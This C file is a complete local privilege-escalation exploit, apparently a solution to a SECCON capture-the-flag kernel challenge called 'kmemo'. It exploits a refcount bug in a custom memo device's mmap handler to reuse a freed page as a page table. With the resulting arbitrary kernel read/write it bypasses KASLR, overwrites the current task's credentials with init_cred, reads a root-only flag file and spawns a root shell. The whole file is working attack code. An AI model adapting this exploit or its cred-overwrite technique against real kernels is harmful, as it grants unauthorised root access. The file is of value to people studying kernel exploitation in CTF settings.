#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

static void __die_errno(const char *path, int line, const char *msg);

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1) {                                                \
      die_errno(#x);                                                           \
    }                                                                          \
    __x;                                                                       \
  })

static void exec_shell(void) {
  char bin_sh[] = "/bin/sh";
  char *argv[] = {bin_sh, NULL};

  check_syscall(execve(argv[0], argv, environ));
}

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "kmemo: %s:%d: ", path, line);
  perror(msg);
  exec_shell();
}

#define MEMOPAGE_SIZE_MAX 0x40000000
#define PAGE_SHIFT 12
#define MEMOPAGE_TABLE_SHIFT 9
#define PUD_MASK ((1ULL << 30) - 1)
#define CONFIG_PHYSICAL_START 0x1000000
#define CONFIG_PHYSICAL_ALIGN 0x200000
#define VMLINUX 0xFFFFFFFF81000000
#define VMLINUX_PCPU_BASE_ADDR 0xFFFFFFFF8194DE50 /* free_percpu() */
#define VMLINUX_CURRENT 0x1FA00                   /* __put_cred() */
#define OFFSETOF_TASK_CRED 0x5B8                  /* __put_cred() */
#define OFFSETOF_TASK_REAL_CRED 0x5B0             /* __put_cred() */
#define VMLINUX_INIT_TASK 0xFFFFFFFF81A12600      /* start_kernel() */
#define VMLINUX_INIT_CRED 0xFFFFFFFF81A38360 /* init_task + offsetof(cred) */
#define MEMO_PAGE_TABLE_OFFSET 0
#define MEMO_DATA_OFFSET (1 << (PAGE_SHIFT + MEMOPAGE_TABLE_SHIFT))

static void rw(int fd, long virt, void *rwbuf, size_t rwsize, bool is_write) {
  check_syscall(lseek(fd, MEMO_PAGE_TABLE_OFFSET, SEEK_SET));
  check_syscall(write(fd, &virt, sizeof(virt)));
  check_syscall(lseek(fd, MEMO_DATA_OFFSET, SEEK_SET));
  if (is_write) {
    check_syscall(write(fd, rwbuf, rwsize));
  } else {
    check_syscall(read(fd, rwbuf, rwsize));
  }
}

int main(void) {
  int fd = check_syscall(open("/dev/tmp-memo", O_RDWR));
  char *p = check_syscall(mmap(NULL, MEMOPAGE_SIZE_MAX, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_NORESERVE, fd, 0));
  /*
   * BUG: mmap_fault() doesn't increment refcount.
   * Since this is MAP_PRIVATE, do_cow_fault() is called.
   * It decrements the refcount, which becomes 0.
   * Note that a new page is mapped at p, so the corruption is not noticeable.
   */
  p[0] = 1;

  /*
   * Trigger kmemo page table allocation.
   * It should reuse the page from above.
   */
  check_syscall(lseek(fd, MEMO_DATA_OFFSET, SEEK_SET));
  char c = 2;
  check_syscall(write(fd, &c, sizeof(c)));

  check_syscall(lseek(fd, MEMO_PAGE_TABLE_OFFSET, SEEK_SET));
  long virt;
  check_syscall(read(fd, &virt, sizeof(virt)));
  printf("kmemo: virt = 0x%lx\n", virt);
  /*
   * KASLR granularity is PUD, see kernel_randomize_memory().
   */
  long page_offset_base = virt & ~PUD_MASK;
  printf("kmemo: page_offset_base = 0x%lx\n", page_offset_base);

  long direct_mapping_vmlinux;
  for (long phys = CONFIG_PHYSICAL_START;; phys += CONFIG_PHYSICAL_ALIGN) {
    direct_mapping_vmlinux = page_offset_base + phys;
    int sig;
    rw(fd, direct_mapping_vmlinux, &sig, sizeof(sig), false);
    if (sig == 0x51258d48) {
      break;
    }
  }
  printf("kmemo: direct_mapping_vmlinux = 0x%lx\n", direct_mapping_vmlinux);

  long init_cred;
  rw(fd,
     direct_mapping_vmlinux + (VMLINUX_INIT_TASK - VMLINUX) +
         OFFSETOF_TASK_CRED,
     &init_cred, sizeof(init_cred), false);
  printf("kmemo: init_cred = 0x%lx\n", init_cred);

  long vmlinux = init_cred - (VMLINUX_INIT_CRED - VMLINUX);
  printf("kmemo: vmlinux = 0x%lx\n", vmlinux);

  long pcpu_base_addr;
  rw(fd, vmlinux + (VMLINUX_PCPU_BASE_ADDR - VMLINUX), &pcpu_base_addr,
     sizeof(pcpu_base_addr), false);
  printf("kmemo: pcpu_base_addr = 0x%lx\n", pcpu_base_addr);

  long current;
  rw(fd, pcpu_base_addr + VMLINUX_CURRENT, &current, sizeof(current), false);
  printf("kmemo: current = 0x%lx\n", current);

  rw(fd, current + OFFSETOF_TASK_REAL_CRED, &init_cred, sizeof(init_cred),
     true);
  rw(fd, current + OFFSETOF_TASK_CRED, &init_cred, sizeof(init_cred), true);

  /* SECCON{d0n7_f0rg37_70_1ncr3m3n7_r3fc0un7} */
  printf("kmemo: flag2: ");
  fflush(stdout);
  system("cat /root/flag2.txt");

  exec_shell();
}
